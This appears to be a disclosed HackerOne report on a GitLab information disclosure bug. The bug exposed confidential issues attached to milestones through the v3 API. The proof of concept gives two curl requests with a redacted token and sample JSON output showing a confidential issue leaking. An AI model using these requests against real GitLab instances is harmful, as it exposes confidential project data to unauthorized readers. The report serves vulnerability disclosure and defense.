@@ -1,0 +1,85 @@
+ReportLink:https://hackerone.com/reports/134300
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/jobert
+ReportedTo:GitLab(gitlab)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.05.2016 0:59:28
+
+Summary:
+
+# Vulnerability details
+When a confidential issue in a public or internal project is attached to a milestone, it is exposed through the GitLab API.
+
+# Proof of concept
+As a victim, create a new public or internal project. Lets state that the project has ID 1. Create a milestone for this project. After that, create a confidential issue for this project and attach it to the milestone. In this proof of concept, we're going to extract the title and description of the confidential issue. As an attacker, start by fetching all the milestones for the project:
+
+```bash
+curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/milestones"
+```
+
+The command will respond with all milestones. In this example, it returns the milestone that was created by the victim:
+
+```json
+[
+  {
+    "id":3,
+    "iid":1,
+    "project_id":1,
+    "title":"Milestone title",
+    "description":"Milestone description",
+    "state":"active",
+    "created_at":"2016-04-22T01:15:37.902Z",
+    "updated_at":"2016-04-22T01:15:37.902Z",
+    "due_date":null
+  }
+]
+```
+
+For each unique milestone ID that is returned in this response, execute the following command:
+
+```bash
+curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/milestones/3/issues"
+```
+
+The response if this request will contain all issues, including **confidential** issues:
+
+```json
+[
+  {
+    "id":13,
+    "iid":1,
+    "project_id":1,
+    "title":"Some confidential issue",
+    "description":"This is some super confidential information.",
+    "state":"opened",
+    "created_at":"2016-04-22T00:59:38.877Z",
+    "updated_at":"2016-04-25T00:10:16.711Z",
+    "labels":[],
+    "milestone": {
+      "id":3,
+      "iid":1,
+      "project_id":1,
+      "title":"Milestone title",
+      "description":"Milestone description",
+      "state":"active",
+      "created_at":"2016-04-22T01:15:37.902Z",
+      "updated_at":"2016-04-22T01:15:37.902Z",
+      "due_date":null
+    },
+    "assignee":null,
+    "author": {
+      "name":"John Doe",
+      "username":"john",
+      "id":1,
+      "state":"active",
+      "avatar_url":"http://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80\u0026d=identicon",
+      "web_url":"http://gitlab-instance/u/john"
+    }
+  }
+]
+```
+
+# Impact
+Confidential issues may contain information that shouldn't be known to the outside. An example could be security issues that are tracked in GitLab for open source projects, like `gitlab-org/gitlab-ce` or `gitlab-org/gitlab-ee`. It may also contain private API tokens that need to be tracked in a task (I wouldn't recommend it, but it happens).
